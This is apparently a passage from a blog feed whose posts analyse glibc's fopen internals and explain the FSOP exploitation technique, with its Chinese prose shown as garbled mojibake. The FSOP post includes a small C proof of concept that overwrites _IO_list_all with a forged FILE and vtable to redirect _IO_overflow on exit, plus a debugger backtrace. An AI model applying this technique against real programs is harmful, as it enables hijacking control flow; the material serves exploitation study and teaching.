_IO_file_fopen)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆæ£€æŸ¥äº†æ˜¯å¦æ­£å¸¸æ‰“å¼€æ–‡ä»¶ï¼Œç´§æ¥ç€å¯¹<strong>omode</strong>å’Œ<strong>oflags</strong>è¿›è¡Œäº†è®¾ç½®ï¼Œå³æ–‡ä»¶æƒé™ç›¸å…³è®¾ç½®ã€‚ç›´æ¥è¿›å…¥<code>_IO_file_open</code>æŸ¥çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L180</span><br>FILE *<br>_IO_file_open (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> posix_mode, <span class="hljs-type">int</span> prot,<br>       <span class="hljs-type">int</span> read_write, <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> fdesc;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))<br>    fdesc = __open_nocancel (filename,<br>     posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">else</span><br>    fdesc = __open (filename, posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">if</span> (fdesc &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_fileno = fdesc;<br>  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);<br>  <span class="hljs-comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span><br><span class="hljs-comment">     update the offset cache though, since the file handle is not active.  */</span><br>  <span class="hljs-keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))<br>      == (_IO_IS_APPENDING | _IO_NO_READS))<br>    &#123;<br>      <span class="hljs-type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="hljs-number">0</span>, _IO_seek_end);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)<br>&#123;<br>  __close_nocancel (fdesc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>    &#125;<br>  _IO_link_in ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br>libc_hidden_def (_IO_file_open)<br></code></pre></td></tr></table></figure><p>é¦–å…ˆä¼šæ ¹æ®<strong>flag2</strong>å†³å®šè°ƒç”¨<code>__open_nocancel</code>æˆ–<code>open</code>ã€‚æ‰“å¼€æ–‡ä»¶ååˆ©ç”¨<code>_IO_mask_flags</code>é‡æ–°åˆå§‹åŒ–<strong>fp-&gt;flag</strong>,éšåè°ƒç”¨<code>_IO_link_in</code>åˆå§‹åŒ–chainåŸŸï¼Œä¸‹é¢æ˜¯<code>_IO_mask_flags</code>å’Œ<code>_IO_link_in</code>çš„æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L518</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_mask_flags(fp, f, mask) \</span><br><span class="hljs-meta">       ((fp)-&gt;_flags = ((fp)-&gt;_flags &amp; ~(mask)) | ((f) &amp; (mask)))</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L86</span><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      fp-&gt;file._chain = (FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ°<code>__fopen_internal</code>å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ¥ä¸‹æ¥è°ƒç”¨äº†<code>__fopen_maybe_mmap</code>ï¼Œç”±æ³¨é‡Šæˆ‘ä»¬å¯çŸ¥ï¼Œè¿™é‡Œæ˜¯æ ¹æ®æ–‡ä»¶çš„æƒé™ï¼Œåšä¸€äº›mmapçš„å¤„ç†ï¼Œç„¶åè¿”å›å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L34</span><br>FILE *<br>__fopen_maybe_mmap (FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨äº†<code>_IO_un_link</code>è¿›è¡Œå°†è¯¥æ–‡ä»¶è¿›è¡Œè§£é“¾æ“ä½œï¼Œéšåfreeæ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L52</span><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      FILE **f;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>_IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br>      <span class="hljs-keyword">else</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_un_link)<br></code></pre></td></tr></table></figure><p>è¿™å°±æ˜¯fopençš„æ•´ä¸ªè¿‡ç¨‹äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å°å°æ€»ç»“ä¸€ä¸‹æµç¨‹ï¼š</p><ul><li>é¦–å…ˆåˆ©ç”¨<code>malloc</code>åˆ›å»ºåŒ…å«<code>_IO_FILE_plus</code>å’Œ<code>_IO_wide_data</code>çš„<code>locked_FILE</code>ç»“æ„ä½“</li><li>æ¥ç€è°ƒç”¨<code>_IO_no_init</code>å‡½æ•°å¯¹<code>_IO_FILE</code>çš„ä¸»è¦å‡ ä¸ªæˆå‘˜å˜é‡è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œä»¥åŠ<code>_wide_data</code>ç›¸å…³å€¼åšåˆå§‹åŒ–</li><li>èµ‹å€¼è™šè¡¨ç»™vtable</li><li>è°ƒç”¨<code>_IO_new_file_init_internal</code>è¿›ä¸€æ­¥åˆå§‹åŒ–ï¼Œä¸»è¦æ˜¯å¯¹**_chain**è¿›è¡Œæ“ä½œ</li><li>è°ƒç”¨<code>_IO_file_fopen</code>æ‰“å¼€æ–‡ä»¶</li><li>æ ¹æ®æ–‡ä»¶çš„æƒé™ï¼Œç”¨<code>__fopen_maybe_mmap</code>åšä¸€äº›å¯èƒ½çš„mmapæ“ä½œ</li><li>è„±ç¦»å•é“¾è¡¨é“¾</li><li>free</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IO_FILEã€‘FSOP</title>
    <link href="/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/"/>
    <url>/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/</url>
    
    <content type="html"><![CDATA[<blockquote><p>FSOP æ˜¯ File Stream Oriented Programming çš„ç¼©å†™ï¼Œæ ¹æ®å‰é¢å¯¹ FILE çš„ä»‹ç»å¾—çŸ¥è¿›ç¨‹å†…æ‰€æœ‰çš„_IO_FILE ç»“æ„ä¼šä½¿ç”¨_chain åŸŸç›¸äº’è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨ç”±_IO_list_all ç»´æŠ¤ã€‚å¦å¤–ç”±äºç½‘ç»œä¸Šå¾ˆå¤šIO_FILEç›¸å…³åšå®¢å«æœ‰ç›¸å…³glibcæºä»£ç ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æºä»£ç çš„å®Œæ•´éƒ¨åˆ†æˆ–è€…é“¾æ¥ã€‚åœ¨ä¹‹åçš„åšå®¢ä¸­ï¼Œæˆ‘ä¼šåŒ…å«è¯¥æ®µä»£ç åœ¨å“ªé‡Œå¯ä»¥æŸ¥çœ‹å¾—åˆ°ã€‚</p></blockquote><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>FSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ_IO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„_IO_FILE é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª FILE è°ƒç”¨ fflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685</span><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/article/fsop/abort_routine.001.jpeg" alt="img"></p><p>è€Œ_IO_flush_all_lockp ä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li>å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶</li><li>å½“æ‰§è¡Œ exit å‡½æ•°æ—¶</li><li>å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶</li></ul><h2 id="æ¢³ç†"><a href="#æ¢³ç†" class="headerlink" title="æ¢³ç†"></a>æ¢³ç†</h2><p>æ¢³ç†ä¸€ä¸‹ FSOP åˆ©ç”¨çš„æ¡ä»¶ï¼Œé¦–å…ˆéœ€è¦æ”»å‡»è€…è·çŸ¥ libc.so åŸºå€ï¼Œå› ä¸º<code>_IO_list_all </code>æ˜¯ä½œä¸ºå…¨å±€å˜é‡å‚¨å­˜åœ¨ libc.so ä¸­çš„ï¼Œä¸æ³„æ¼ libc åŸºå€å°±ä¸èƒ½æ”¹å†™<code>_IO_list_all</code>ã€‚</p><p>ä¹‹åéœ€è¦ç”¨ä»»æ„åœ°å€å†™æŠŠ<code>_IO_list_all</code> çš„å†…å®¹æ”¹ä¸ºæŒ‡å‘æˆ‘ä»¬å¯æ§å†…å­˜çš„æŒ‡é’ˆï¼Œ</p><p>ä¹‹åçš„é—®é¢˜æ˜¯åœ¨å¯æ§å†…å­˜ä¸­å¸ƒç½®ä»€ä¹ˆæ•°æ®ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯éœ€è¦å¸ƒç½®ä¸€ä¸ªæˆ‘ä»¬ç†æƒ³å‡½æ•°çš„ vtable æŒ‡é’ˆã€‚ä½†æ˜¯ä¸ºäº†èƒ½å¤Ÿè®©æˆ‘ä»¬æ„é€ çš„ fake_FILE èƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œè¿˜éœ€è¦å¸ƒç½®ä¸€äº›å…¶ä»–æ•°æ®ã€‚ è¿™é‡Œçš„ä¾æ®æ˜¯æˆ‘ä»¬å‰é¢ç»™å‡ºçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®æ˜¯ä¸¤ä¸ªæ¡ä»¶äºŒé€‰ä¸€</p><ol><li>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt; _IO_write_ptr &gt; fp-&gt; _IO_write_base</li><li>_IO_vtable_offset (fp) &#x3D;&#x3D; 0 &amp;&amp; fp-&gt; _mode &gt; 0 &amp;&amp; (fp-&gt;wide_data-&gt; _IO_write_ptr &gt; fp-&gt; _wide_data-&gt; _IO_write_base)</li></ol><p>ä½†æ˜¯vtableæ˜¾ç„¶ä¸ä¼šè®¾ç½®ä¸º0ï¼Œé‚£ä¹ˆå°±è¦æ»¡è¶³æ¡ä»¶1ï¼Œæ‹†åˆ†å‡ºæ¥ä¸¤ä¸ªéƒ¨åˆ†</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0 </li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</li></ul><p>åœ¨è¿™é‡Œé€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥éªŒè¯è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆæˆ‘ä»¬åˆ†é…ä¸€å—å†…å­˜ç”¨äºå­˜æ”¾ä¼ªé€ çš„ vtable å’Œ _IO_FILE_plusã€‚ ä¸ºäº†ç»•è¿‡éªŒè¯ï¼Œæˆ‘ä»¬æå‰è·å¾—äº† _IO_write_ptrã€ _IO_write_baseã€ _mode ç­‰æ•°æ®åŸŸçš„åç§»ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¼ªé€ çš„ vtable ä¸­æ„é€ ç›¸åº”çš„æ•°æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br><br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br><br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨åˆ†é…å†…å­˜çš„å‰ 0x100 ä¸ªå­—èŠ‚ä½œä¸º_IO_FILEï¼Œå 0x100 ä¸ªå­—èŠ‚ä½œä¸º vtableï¼Œåœ¨ vtable ä¸­ä½¿ç”¨ 0x41414141 è¿™ä¸ªåœ°å€ä½œä¸ºä¼ªé€ çš„ _IO_overflow æŒ‡é’ˆã€‚</p><p>ä¹‹åï¼Œè¦†ç›–ä½äº libc ä¸­çš„å…¨å±€å˜é‡ _IO_list_allï¼ŒæŠŠå®ƒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ _IO_FILE_plusã€‚</p><p>é€šè¿‡è°ƒç”¨ exit å‡½æ•°ï¼Œç¨‹åºä¼šæ‰§è¡Œ _IO_flush_all_lockpï¼Œç»è¿‡ fflush è·å– _IO_list_all çš„å€¼å¹¶å–å‡ºä½œä¸º _IO_FILE_plus è°ƒç”¨å…¶ä¸­çš„ _IO_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">---&gt; call _IO_overflow<br>[#<span class="hljs-number">0</span>] <span class="hljs-number">0x7ffff7a89193</span> â†’ Name: _IO_flush_all_lockp(do_lock=<span class="hljs-number">0x0</span>)<br>[#<span class="hljs-number">1</span>] <span class="hljs-number">0x7ffff7a8932a</span> â†’ Name: _IO_cleanup()<br>[#<span class="hljs-number">2</span>] <span class="hljs-number">0x7ffff7a46f9b</span> â†’ Name: __run_exit_handlers(status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span class="hljs-number">0x1</span>)<br>[#<span class="hljs-number">3</span>] <span class="hljs-number">0x7ffff7a47045</span> â†’ Name: __GI_exit(status=&lt;optimized out&gt;)<br>[#<span class="hljs-number">4</span>] <span class="hljs-number">0x4005ce</span> â†’ Name: main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IO_FILEã€‘house of cat</title>
    <link href="/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/"/>
    <url>/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/</url>
    
